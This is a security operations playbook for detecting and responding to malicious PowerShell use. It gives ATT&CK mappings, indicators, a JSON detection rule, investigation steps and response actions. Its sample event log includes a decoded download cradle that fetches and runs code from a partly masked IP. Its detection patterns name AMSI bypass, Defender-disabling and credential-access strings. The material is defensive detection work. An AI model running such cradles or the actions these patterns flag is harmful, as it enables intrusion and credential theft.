# GreyNOC Security Playbook

## Suspicious PowerShell Execution Detection & Response

---

### 1. Overview

PowerShell remains the most-abused native administrative interface on Windows. Its access to .NET, COM, WMI, the Win32 API, and remoting makes it equally valuable to defenders, IT, and attackers. Adversaries use PowerShell for download cradles, in-memory loaders, AMSI bypasses, lateral movement (`Invoke-Command`, `Enter-PSSession`), credential access (`Invoke-Mimikatz` derivatives, `LSASS` access via .NET), and persistence (WMI subscriptions, scheduled tasks).

PowerShell is signed, present by default, and commonly allowlisted. Detection cannot rely on "PowerShell ran"; it has to focus on how it ran and what it did.

---

### 2. MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Command and Scripting Interpreter: PowerShell | T1059.001 | Execution |
| Obfuscated Files or Information | T1027 | Defense Evasion |
| Indicator Removal: Clear Windows Event Logs | T1070.001 | Defense Evasion |
| Reflective Code Loading | T1620 | Defense Evasion |
| Ingress Tool Transfer | T1105 | Command and Control |
| Remote Services: WinRM | T1021.006 | Lateral Movement |

---

### 3. Detection Strategy

PowerShell detection breaks into two layers:

1. Telemetry sufficiency. Without script-block logging (4104), module logging (4103), and process command-line capture (4688 with cmdline, or Sysmon EID 1), there is nothing to detect on. The first job is making sure these are enabled at scale.
2. Behavioral detection on logged content. Once telemetry is rich, detect on:
   - Encoded or obfuscated invocations (`-EncodedCommand`, `-enc`, base64 blobs, char-array obfuscation, format-string obfuscation, backtick splits).
   - Download cradles (`Net.WebClient.DownloadString`, `Invoke-WebRequest`, `Invoke-RestMethod`, `Start-BitsTransfer`, `IEX (New-Object Net...)`).
   - In-memory execution primitives (`IEX`, `Invoke-Expression`, `[Reflection.Assembly]::Load`, `VirtualAlloc`, `WriteProcessMemory`, `CreateRemoteThread`, `Add-Type` with inline C#).
   - AMSI / logging tampering (`amsi.dll`, `AmsiScanBuffer`, `AmsiInitFailed`, `Set-MpPreference -DisableRealtimeMonitoring`, `Clear-EventLog`).
   - Credential access primitives (`comsvcs.dll MiniDump`, `Invoke-Mimikatz`, LSASS handle requests from PowerShell).
   - Suspicious parents (Office apps, mshta, wscript, or browsers spawning powershell.exe).
   - Lateral movement via `Invoke-Command`, `New-PSSession`, WSMan.
   - Constrained-language-mode bypass attempts.

---

### 4. Key Indicators

- `powershell.exe` or `pwsh.exe` invoked with `-enc`, `-EncodedCommand`, `-w hidden`, `-nop`, `-ExecutionPolicy Bypass`.
- Long base64 strings on the command line, especially decoding to `IEX` or HTTP cradles.
- `IEX(New-Object Net.WebClient).DownloadString('http...')` and equivalents.
- Reflective loads: `[Reflection.Assembly]::Load([Convert]::FromBase64String(...))`.
- `Add-Type` compiling inline C# that calls Win32 APIs (`VirtualAlloc`, `CreateThread`).
- AMSI patching strings or known bypass pattern hashes in script-block logs.
- PowerShell parent process is `winword.exe`, `excel.exe`, `outlook.exe`, `mshta.exe`, `wscript.exe`, a browser, or `w3wp.exe`.
- PowerShell making outbound network connections to non-Microsoft / non-corporate destinations.
- LSASS handle access (Sysmon EID 10) by powershell.exe.
- WMI Event subscription creation from PowerShell.

---

### 5. Sample Detection Logic (JSON-style)

```json
{
  "rule_name": "Suspicious PowerShell - Encoded + Cradle + Anomalous Parent",
  "description": "Detects high-confidence malicious PowerShell invocations combining encoding, network download primitives, or anomalous parents.",
  "data_source": [
    "WindowsEvent.Security:4688",
    "WindowsEvent.PowerShell:4103/4104",
    "Sysmon:1/3/10"
  ],
  "logic": {
    "where_any": [
      {
        "image_in": ["powershell.exe", "pwsh.exe"],
        "command_line_matches_any": [
          "-enc(odedcommand)?\\s+[A-Za-z0-9+/=]{50,}",
          "FromBase64String\\(",
          "DownloadString\\(",
          "Invoke-Expression",
          "\\bIEX\\b",
          "Reflection\\.Assembly\\]::Load",
          "AmsiScanBuffer",
          "Set-MpPreference.*-Disable"
        ]
      },
      {
        "image_in": ["powershell.exe", "pwsh.exe"],
        "parent_image_in": [
          "winword.exe","excel.exe","outlook.exe","powerpnt.exe",
          "mshta.exe","wscript.exe","cscript.exe",
          "chrome.exe","msedge.exe","firefox.exe",
          "w3wp.exe","sqlservr.exe"
        ]
      },
      {
        "image_in": ["powershell.exe","pwsh.exe"],
        "target_image": "lsass.exe",
        "granted_access_matches": "0x10|0x40|0x1010|0x1410"
      }
    ]
  },
  "severity": "high",
  "tags": ["T1059.001", "T1027", "execution", "endpoint"]
}
```

---

### 6. Example Event Data

```
EID 4688
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
NewProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAk...

EID 4104 (decoded script block)
$s=New-Object Net.WebClient; $s.Headers.Add('User-Agent','Mozilla/5.0');
IEX($s.DownloadString('http://45.61.X.X/a'))

Sysmon EID 3
Image: powershell.exe
DestinationIp: 45.61.X.X
DestinationPort: 80
```

---

### 7. Investigation Steps

1. **Recover the full command.** Decode any `-enc` payload; pull EID 4104 script blocks for the session and stitch them in order.
2. **Reconstruct the chain.** Trace the parent process; if Office or browser, pull the originating document, email, or URL.
3. **Network triage.** Resolve any URLs / IPs the script touched; check reputation, age, hosting, and other endpoints connecting to them.
4. **Endpoint state.** Search for dropped files, scheduled tasks, services, registry persistence, and WMI subscriptions created near the execution time.
5. **Identity impact.** Did the script touch LSASS, DPAPI, credential stores, or perform domain enumeration (`net group "Domain Admins" /domain`, `dsquery`, `BloodHound` collectors)?
6. **Lateral movement.** Inspect `Invoke-Command` / WinRM / SMB usage from the host outward.
7. **Scope.** Search the fleet for the same script-block hash, decoded-string substrings, and outbound C2 indicators.

---

### 8. False Positive Considerations

- IT and DevOps automation using legitimate `-enc` (encoded commands are a normal way to ship complex scripts via GPO / scheduled tasks).
- Endpoint management tools (SCCM, Intune, Tanium, Ansible) launching PowerShell with hidden windows.
- Vendor installers using `IEX` against signed / corporate URLs.
- Application performance monitoring agents using `Add-Type`.
- Approved red-team and adversary-emulation activity.

---

### 9. Tuning Guidance

- **Don't tune by suppressing `-enc`.** Tune by allowlisting **known-good encoded payloads / hashes** while keeping the rule on.
- Maintain **per-host and per-image baselines** for legitimate parents of `powershell.exe` (e.g., SCCM client) and alert on novelty.
- Combine signals: a single feature (e.g., `-enc`) is medium-confidence; **two combined** (`-enc` + Office parent, `IEX` + outbound to hosting ASN) is high-confidence.
- Hash-pivot on the most discriminating field — the **decoded script block** — rather than the command line, which can be trivially reordered.
- Where feasible, enforce **PowerShell Constrained Language Mode** for non-admin users; this collapses the relevant attack surface dramatically and makes detection easier.

---

### 10. Response Actions

**Immediate**

- Isolate the endpoint at the network layer (EDR isolation or NAC quarantine).
- Suspend the user session; collect volatile memory and recent script-block / module logs.
- Block any C2 destinations at the perimeter and on EDR.
- Snapshot the host for forensics before remediation.

**Short-term**

- Hunt the fleet for the same script-block hashes, decoded substrings, and C2 IOCs.
- Reset credentials for any user that authenticated to the host since the execution; revoke Kerberos tickets if domain-joined.
- Remove dropped persistence: scheduled tasks, services, WMI subscriptions, registry run keys, startup folder entries.
- Patch / mitigate the initial access vector (phishing payload, exposed RCE).

**Long-term**

- Enable script-block logging (4104), module logging (4103), and PowerShell transcription tenant-wide.
- Enforce Constrained Language Mode and signed-script execution policy for non-admins.
- Restrict outbound from user endpoints to a curated egress allowlist where feasible.
- Treat unsigned / encoded PowerShell on user endpoints as anomalous by default.

---

### 11. Escalation Criteria

Escalate to incident when **any** of the following are true:

- Decoded script block performs network download + in-memory execution.
- LSASS access, ticket dumping, or credential-theft tooling is observed.
- PowerShell parent is Office, mshta, wscript, or a browser.
- AMSI / Defender tampering is observed.
- Lateral movement (`Invoke-Command`, WinRM, SMB) follows the execution.
- Multiple endpoints exhibit the same script-block hash within a short window.

---

### 12. Analyst Notes Template

```
Incident ID:
Detection Rule:
Detected At:
Host / User:
Parent Process:
Command Line (raw):
Decoded Script Block (hash + first 500 chars):
Network Destinations Touched:
Persistence Created:
Credential / LSASS Activity:
Lateral Movement Indicators:
Containment Actions:
Fleet Sweep Findings:
Outstanding Risks:
Recommendations:
Analyst:
```

---

### 13. Summary

This is a telemetry problem before it is a detection problem. With script-block logging, module logging, and Sysmon in place, the highest-value rules combine encoding or obfuscation with network download primitives, anomalous parents, or credential-access behavior. Constrained Language Mode and execution-policy enforcement collapse the attack surface dramatically; the rest is detection-and-response on what slips past those controls.

---

*GreyNOC — detection-engineering-first security operations.*
